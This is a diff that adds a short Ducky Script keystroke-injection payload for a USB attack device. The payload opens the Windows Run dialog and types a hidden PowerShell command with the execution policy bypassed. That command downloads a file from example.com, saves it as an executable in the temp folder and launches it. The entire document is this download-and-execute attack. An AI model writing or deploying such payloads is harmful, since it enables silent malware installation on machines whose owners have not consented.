@@ -1,0 +1,4 @@
+GUI r
+DELAY 100
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http://example.com/bob.txt',\"$env:temp\bob.exe\"); Start-Process \"$env:temp\bob.exe\""
+ENTER
